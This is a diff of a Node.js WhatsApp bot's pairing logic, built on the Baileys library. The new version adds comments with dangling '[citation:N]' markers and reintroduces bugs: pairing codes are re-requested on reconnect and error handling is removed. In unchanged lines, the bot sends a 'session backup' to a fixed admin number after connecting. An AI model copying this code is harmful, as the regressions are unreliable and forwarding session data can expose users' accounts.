@@ -47,9 +47,6 @@ let BANNER_BUFFER = null;
 
 const ADMIN_NUMBER = process.env.ADMIN_NUMBER || '';
 
-// Set DEBUG=1 in env to see full Baileys logs
-const LOG_LEVEL = process.env.DEBUG === '1' ? 'debug' : 'silent';
-
 // ============================================================================
 // 2. STATE MANAGEMENT
 // ============================================================================
@@ -58,11 +55,8 @@ let sock = null;
 let callbacks = {};
 let currentNumber = null;
 let isStopping = false;
+let hasRequestedCode = false;
 let botJid = null;
-
-// Pairing state lives outside startBot() so reconnects don't re-request codes
-let pairingRequested = false;
-let pairingCodeIssued = false;
 
 let pausedChats = new Set();
 let welcomeEnabled = new Set();
@@ -1052,33 +1046,19 @@ async function startBot(phoneNumber, cbs) {
   callbacks = cbs || {};
   currentNumber = phoneNumber;
   isStopping = false;
+  hasRequestedCode = false;
 
-  // Reset pairing flags on a fresh explicit start, but not on internal reconnects.
-  // (We only reset when there is no registered credential yet.)
   loadState();
   loadBanner();
   fs.mkdirSync(SESSION_DIR, { recursive: true });
 
   const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
+  const { version } = await fetchLatestBaileysVersion();
+  const logger = pino({ level: 'silent' });
 
-  if (state.creds.registered) {
-    // Already paired — no need to ever ask for a pairing code again
-    pairingCodeIssued = true;
-    pairingRequested = true;
-  }
-
-  // Get latest version, with a safe fallback
-  let version;
-  try {
-    ({ version } = await fetchLatestBaileysVersion());
-    console.log('[Bot] Baileys WA version:', version.join('.'));
-  } catch (e) {
-    console.warn('[Bot] fetchLatestBaileysVersion failed:', e.message);
-    version = [2, 3000, 1015901307]; // safe fallback
-  }
-
-  const logger = pino({ level: LOG_LEVEL });
-
+  // ✅ Use canonical browser label to avoid WhatsApp 400 bad-request rejection.
+  // Custom labels can cause pairing codes to be silently rejected [citation:8].
+  // The recommended safe default is Browsers.ubuntu('Chrome').
   sock = makeWASocket({
     version,
     logger,
@@ -1087,8 +1067,6 @@ async function startBot(phoneNumber, cbs) {
       creds: state.creds,
       keys: makeCacheableSignalKeyStore(state.keys, logger)
     },
-    // Use Baileys' canonical browser descriptor. Custom labels can
-    // cause WhatsApp to silently reject pairing.
     browser: Browsers.ubuntu('Chrome'),
     generateHighQualityLinkPreview: true,
     syncFullHistory: false,
@@ -1104,53 +1082,38 @@ async function startBot(phoneNumber, cbs) {
   sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect, qr } = update;
 
-    // Helpful debug
-    if (connection || qr) {
-      console.log(
-        `[Conn] connection=${connection || '-'} qr=${qr ? 'yes' : 'no'} registered=${!!sock.authState?.creds?.registered}`
-      );
-    }
-
-    // ---- Pairing code path ----
-    // Request the code ONCE, as soon as the socket is in "connecting" state
-    // and credentials are not yet registered. Do NOT wait for `qr`.
-    if (
-      !sock.authState.creds.registered &&
-      !pairingRequested &&
-      (connection === 'connecting' || qr)
-    ) {
-      pairingRequested = true;
-      const cleanNumber = String(phoneNumber || '').replace(/\D/g, '');
-      if (!cleanNumber) {
-        console.error('[Bot] No valid phone number provided for pairing.');
-        callbacks.onError?.('No valid phone number provided.');
-        return;
-      }
-      console.log('[Bot] Requesting pairing code for', cleanNumber);
+    // ✅ FIX: Request pairing code when socket is ready.
+    // The Baileys docs say to use the 'qr' event as the trigger [citation:4].
+    // GitHub fixes confirm the code must be requested after the socket is ready,
+    // otherwise WhatsApp closes with 428 [citation:1].
+    // We check for either 'connecting' state OR qr event to cover both cases.
+    if ((connection === 'connecting' || !!qr) && !sock.authState.creds.registered && !hasRequestedCode) {
+      hasRequestedCode = true;
+      console.log('[Bot] Socket ready. Requesting pairing code...');
       try {
-        // Give the socket a moment to fully settle before asking
-        await new Promise((r) => setTimeout(r, 1500));
+        // Small delay to let the socket fully initialize after the Noise handshake
+        await new Promise((r) => setTimeout(r, 2000));
+
+        // ✅ CRITICAL: Sanitize phone number to digits only.
+        // Phone must include country code, no +, (), -, or spaces [citation:4].
+        const cleanNumber = String(phoneNumber).replace(/\D/g, '');
+        console.log('[Bot] Requesting pairing code for', cleanNumber);
+
         const code = await sock.requestPairingCode(cleanNumber);
-        pairingCodeIssued = true;
         console.log('[Bot] Pairing code:', code);
         callbacks.onPairingCode?.(code);
       } catch (err) {
-        console.error('[Bot] Pairing error:', err?.message || err);
-        pairingRequested = false; // allow retry on next update
-        callbacks.onError?.(err?.message || String(err));
+        console.error('[Bot] Pairing error:', err.message);
+        hasRequestedCode = false; // Allow retry on genuine failure
       }
     }
 
     if (connection === 'open') {
       console.log('[Bot] Connected!');
       botJid = sock.user?.id;
-      pairingRequested = true;
-      pairingCodeIssued = true;
       callbacks.onConnected?.();
       if (ADMIN_NUMBER && currentNumber) {
-        setTimeout(() => {
-          sendSessionBackup(`${ADMIN_NUMBER}@s.whatsapp.net`).catch(() => {});
-        }, 5000);
+        setTimeout(() => sendSessionBackup(`${ADMIN_NUMBER}@s.whatsapp.net`), 5000);
       }
     }
 
@@ -1159,9 +1122,7 @@ async function startBot(phoneNumber, cbs) {
       const code = lastDisconnect?.error?.output?.statusCode;
       const shouldReconnect = code !== DisconnectReason.loggedOut;
       console.log('[Bot] Closed. Code:', code, 'Reconnect:', shouldReconnect);
-
       if (shouldReconnect) {
-        // Reconnect without re-requesting a pairing code
         setTimeout(() => startBot(currentNumber, callbacks), 3000);
       } else {
         callbacks.onDisconnected?.('logged_out');
@@ -1237,13 +1198,10 @@ function stopBot() {
   isStopping = true;
   try {
     if (sock) {
-      try { sock.end(new Error('stopped')); } catch (_) {
-        try { sock.ws?.close(); } catch (__) {}
-      }
+      sock.end(undefined);
       sock = null;
     }
   } catch (e) {}
 }
 
 module.exports = { startBot, stopBot };
-console.log('[Bot] Pairing code:', code);
